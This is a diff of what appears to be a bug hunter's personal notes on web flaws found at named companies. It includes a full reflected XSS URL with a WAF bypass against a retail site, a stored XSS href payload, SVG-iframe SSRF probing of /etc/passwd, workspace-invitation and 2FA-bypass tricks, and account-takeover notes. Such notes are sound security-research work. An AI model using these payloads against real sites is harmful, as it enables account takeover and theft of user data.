@@ -54,7 +54,25 @@ test your payloads in JSfiddle
 - [ ] Search the Sinks first -> why ? usually less in number 
 	- [ ] different pages -> loading different JSs => new sources & sinks => *search again* 
 	- [ ] sources + sinks != same place
-#### Authneticarion transfer bug between mac app and webappz 
+- [ ] in workspace's invitation feature, we had two paths: 
+	- ![[Pasted image 20260302031416.png]]
+		1. (1)![[Pasted image 20260302032401.png]]
+		2. (2)![[Pasted image 20260302032341.png]]
+		-  in the past these two routes were both the same like above - the (1) request leaded to (2) request with full authorized headers (hDOM) ( *there was no token parameter in querystring* ) and therefore we could've used user_id of the victim and join him/her into our workspace without premission => bug 
+		      (impact: user can upload into out workspace and we have access to the files)
+		- [ ] test cases: 
+			- [ ] using a valid token from somewhere else 
+			- [ ] nulling/removing the token 
+			- [ ] ==client side path traversal == CSPT== (you should look for links that result to sending other requests)
+				- [ ] candidate examples: ![[Pasted image 20260302034419.png]] (you see SPA with value in the link)
+- [ ] we saw a file upload feature 
+	- [ ] you could upload svg file there
+		- [ ] tested SSRF by iframe in svg
+			- [ ] ![[Pasted image 20260523135436.png]]
+			- [ ] /etc/passwd => 404 not found to the collab server + referrer = localhost:3000
+				- [ ] ![[Pasted image 20260523135614.png]]
+				- [ ] the HTTP server cant access local files
+#### Authneticarion transfer bug between mac app and webapp
 - [ ] **==confirmation HTTP request==**
 	- [ ] one click ATO in capcut (web to mac app)![[Pasted image 20260121222821.png]]
 		  ![[Pasted image 20260121225108.png]]
@@ -136,4 +154,23 @@ test your payloads in JSfiddle
 			-  final exploit using XHR: ![[Pasted image 20260303192142.png]] 
 # Royalcanin
 - ![[Pasted image 20260312172156.png]]
-- 
+# romwe
+- first part : 
+	XSS on error parameter (it removes script (*change after ruleset*) and uses array parqameter + waf bypassed by multiline html comment) `https://uk.romwe.com/user/auth/thirdCb?is_redirect=1&authuser=0&code=4%2F0AVMBsJipuFL7G3mB3zFsq2WNIIGHSA_nWtbW-kUEyDIPnLaPdwxusQcWRSGnJVFvU-QzdQ&contentIds=&newCccPublicBanner=1&pageType=topBanner&prompt=consent&ref=www&rep=dir&ret=us&scope=email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20openid&state=type%3Dgoogle%26site%3Druwku%26s%3Df4ce28c18765cbb7adc7f3f38963bc9c67ddbba498e3ab41d684cd155642&error=/%3C/script%3Eipt%3E%3Cimg+src=x+oner%3C/script%3Eror=ale%3C/script%3Ert(origin)%3E&error=b`
+- second part
+	- ATO by changing the user phone number 
+		- ![[Pasted image 20260409184818.png]]
+	- ATO using window opener ![[Pasted image 20260409184622.png]] 
+		- why ? => ![[Pasted image 20260409184720.png]]
+# TikTok
+- [ ]  the story behind 7500$ stored XSS in file uploader (website field where input went into href tag) (bellow is the payload he used)
+	- [ ] **href in `<a>` tag** -> `__template__:test&temp=javascript` (we concluded the first part from js analysis in order not to breaking the app )
+![[Pasted image 20260409214743.png]]
+
+
+
+# byteplus
+- the program had *several options in order to check the 2FA state* (Email, Tel, phone,...)
+	- the normal flow was through email option
+	- `"EventName": "SendSecurityEmailCode"` we changed it to -> `"EventName": "SendSecurityTelCode"`
+	- and we used *null characters to bypass the code* (0000000 || null || empty || etc) 
